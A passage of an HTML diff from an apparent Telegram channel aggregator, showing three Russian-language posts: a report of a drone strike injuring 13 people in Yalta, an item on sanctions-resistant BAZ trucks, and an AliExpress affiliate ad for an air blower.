+      <p class="meta"><time datetime="2026-07-22T12:25:31.505Z">Jul 22, 2026, 12:25 PM</time> · <a href="/post/1176946065">View post on margeleT</a></p>
+    </article>
+<article class="post">
+      <a class="post-link" href="/post/2684009488">
+        <p class="source">
+        <img class="source-avatar" src="https://cdn4.telesco.pe/file/gxeCERpA07Ld9fEYX_NIj83twCHxxpdLk_eav22xwQTMzVRIccZR4pSpI3XMJENvYuEGYYvA54WURFzxJKQunAVi_oCdwQzXYqPOOjFyKt9-6iUKpdx6S7FxdqsO5ZJ6BwgOO_RnAFppJTak0aFUvHdo2HhBo3V61MIMN9JnoMOaTfCF3Ymqb-ttZ25sTKs6MRPtRGGP7w28XUsBt_ZeYddExKd0LcZvYl2LDP3x19vVwaxn4PEvLsJbMizYFqqGnp5k3QgBOdG9WvPX4McKsdp8iYvdo7XGVw2nIiq2I1i9GKv1U0oQjYcl-xJcxTba-8vbVcOrwApf-BT_jIA6Kw.jpg" alt="" loading="lazy" referrerpolicy="no-referrer" />
+        <span class="source-main">
+          <span class="source-title-row"><strong class="source-title">Авто Белгород</strong></span>
+          <span>@avto_belgorod31</span>
+        </span>
+      </p>
+        
+        <h3>❗️13 человек пострадали из-за удара дрона ВСУ по многоэтажке в Ялте. Трое…</h3>
+        <p>❗️13 человек пострадали из-за удара дрона ВСУ по многоэтажке в Ялте. Трое из них в тяжелом состоянии. 📌 Авто Белгород - подписаться ✉️ Отправить новость 📱 Авто Белгород в МАХ</p>
+      </a>
+      <p class="meta"><time datetime="2026-07-22T12:25:31.505Z">Jul 22, 2026, 12:25 PM</time> · <a href="/post/2684009488">View post on margeleT</a></p>
+    </article>
+<article class="post">
+      <a class="post-link" href="/post/1900482666">
+        <p class="source">
+        <img class="source-avatar" src="https://cdn4.telesco.pe/file/djO76ol647gt0SCvfoz0_I7ivxZy5VmqWzLHhW6pVVgnbPXzWikq5Fwg_hMVHsTbwp13hsudWl3B9tNymOjDN7GWehZ6Ja3hyWjZ036LpDWqzjWTncZz2QzOsDtPelz5tEd-_jBTEHTB8SCVljIGd9XqeV8a-l3QDamxfSN_BQPSl7vBjE-bW0hD-rDdFFzLrCNFH20T-u65X_sqEXqvmi4v1ETbsZFPfyJHbUDsKDK9b9xW84cUGg_mRV3vrQS_J6mzJZ-8VML8ytDumMaXbc55mY7rkdDqDZYNBNNLGUWKfwF4bF4GcJHbMY9ujHkzpg9rWaBYgCJLPFYrRIhfqA.jpg" alt="" loading="lazy" referrerpolicy="no-referrer" />
+        <span class="source-main">
+          <span class="source-title-row"><strong class="source-title">Телеканал «Авто Плюс»</strong><span class="verified-badge" title="Verified" aria-label="Verified">
+    <svg width="14" height="14" viewBox="0 0 150 150" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+      <defs>
+        <linearGradient id="tg_v_grad_seo" x1="74.8279" y1="-10.5043" x2="74.8279" y2="161.383" gradientUnits="userSpaceOnUse">
+          <stop stop-color="#5ABEF7" />
+          <stop offset="1" stop-color="#0096FF" />
+        </linearGradient>
+        <mask id="tg_v_mask_seo">
+          <rect width="150" height="150" fill="black" />
+          <path d="M37.1506 10.7746C38.8073 1.29262 49.8359 -3.16301 57.6144 2.50705L68.0031 10.0793C72.4989 13.3565 78.5816 13.4103 83.134 10.2121L93.6525 2.82151C101.529 -2.71218 112.478 1.93572 113.969 11.4455L115.96 24.1457C116.822 29.642 121.085 33.9811 126.566 34.9387L139.23 37.1506C148.712 38.8072 153.168 49.8359 147.497 57.6145L139.925 68.0031C136.648 72.499 136.595 78.5817 139.793 83.134L147.183 93.6526C152.716 101.529 148.069 112.478 138.559 113.969L125.859 115.96C120.362 116.822 116.024 121.085 115.067 126.566L112.854 139.23C111.197 148.712 100.168 153.168 92.3898 147.497L82.0021 139.925C77.5063 136.648 71.4226 136.595 66.8703 139.793L56.3517 147.183C48.4754 152.716 37.5261 148.069 36.0348 138.559L34.0438 125.859C33.1816 120.362 28.9184 116.024 23.437 115.067L10.7738 112.854C1.29185 111.197 -3.16378 100.168 2.50628 92.3898L10.0786 82.0021C13.3557 77.5063 13.4096 71.4226 10.2113 66.8703L2.82074 56.3517C-2.71295 48.4754 1.93495 37.5261 11.4447 36.0348L24.1449 34.0438C29.6412 33.1816 33.9803 28.9184 34.9379 23.437L37.1506 10.7746Z" fill="white" />
+        </mask>
+      </defs>
+      <rect width="150" height="150" fill="url(#tg_v_grad_seo)" mask="url(#tg_v_mask_seo)" />
+      <path d="M63.6244 96.3518C61.2894 96.3518 59.0921 95.4431 57.4374 93.7886L46.182 82.5331C42.7679 79.1191 42.7679 73.5841 46.182 70.1698C49.5963 66.7558 55.1313 66.7558 58.5453 70.1698L63.6244 75.2489L91.4548 47.4185C94.8691 44.0045 100.404 44.0045 103.818 47.4185C107.232 50.8328 107.232 56.3678 103.818 59.7821L69.8114 93.7886C68.1569 95.4431 65.9594 96.3518 63.6244 96.3518Z" fill="white" />
+    </svg>
+  </span></span>
+          <span>@autoplustvru</span>
+        </span>
+      </p>
+        <img src="https://cdn4.telesco.pe/file/T8lbLIgeCzHKtS8I7qJnVOQE1K_O0JMU7FE6RoB0wH8sYs9DkfRDKaSJjs-UOB_cQ_9g-pTBbXMc2CBjSXSRhWFR4CUeA-EFFBcAafGzRGPZ7wguiky_C7PdYB4EchGt_DsxHaTTIoeElcUgIARUjQByZ0kAR0BL0TocKgGuBci8tojvBiDMs3b7rL12Lr3zUnq23nPHv-Em11xS5IMBU7HTVKm7ifcsZuWQHMG8ccjhUUPQoe8soJCr-IPvOZzHFJYR8cVoEWwBeD_35v9FXB0cKASusVYMcTJ8lNt9KUaGpdZyKMn8SMrR4s7H36y2_9mnGhe3AvEROG2fScbe3A.jpg" alt="" loading="lazy" referrerpolicy="no-referrer" />
+        <h3>БАЗ намерен стать мощнее Петербургская фирма «Романов» с самого начала ст…</h3>
+        <p>БАЗ намерен стать мощнее Петербургская фирма «Романов» с самого начала стремилась сделать грузовики марки БАЗ устойчивыми к санкциям. На практике это означает максимальное использование российских и белорусских компонентов, что хорошо с точки зрения импортоза…</p>
+      </a>
+      <p class="meta"><time datetime="2026-07-22T12:25:18.082Z">Jul 22, 2026, 12:25 PM</time> · <a href="/post/1900482666">View post on margeleT</a></p>
+    </article>
+<article class="post">
+      <a class="post-link" href="/post/2428060038">
+        <p class="source">
+        <img class="source-avatar" src="https://cdn4.telesco.pe/file/UZE-9eWESMIoX_HVg9Im4P-5z6r2vPdIem4jqQruWHX0TbB8tK-ruJHGoO3EcdN5vD1AHheqnv6uGS3l1cEoY34p7nBCaVlAssO8tlifOf87kCVbkVTV_P1uMVeS6_1C2xMpdMEqZwq7Y_wpado70Q-pizVCaPZAt_U0oq4T5wgOuMhWvBG_7hltRcig0_Q3svbjOlSknU8VcZZKXIrBmuhVCmvddnq5T576zvrKmdcQZZs306d1z7FfTeGrlxqgW-_nGk-7Lv7kYTgZxaVDewi5jtVU6eE2vq9BI_e2kf__uHzv1C-rsTUjMG9AQZT6HUUfMX_SjyVUPVxAJ_sUMQ.jpg" alt="" loading="lazy" referrerpolicy="no-referrer" />
+        <span class="source-main">
+          <span class="source-title-row"><strong class="source-title">AliExpress для авто</strong></span>
+          <span>@aliexpauto</span>
+        </span>
+      </p>
+        
+        <h3>Дешевая воздуходувка, подойдет для розжига углей, чистки компьютера от пы…</h3>
+        <p>Дешевая воздуходувка, подойдет для розжига углей, чистки компьютера от пыли и чистки кузова авто от влаги после мойки на аliеxрrеss - https://ali.click/tfhkh1f?erid=2SDnjevRjE3</p>
+      </a>
+      <p class="meta"><time datetime="2026-07-22T12:24:55.377Z">Jul 22, 2026, 12:24 PM</time> · <a href="/post/2428060038">View post on margeleT</a></p>
+    </article>
+    </section>
+  </main>
+</body>
+</html>
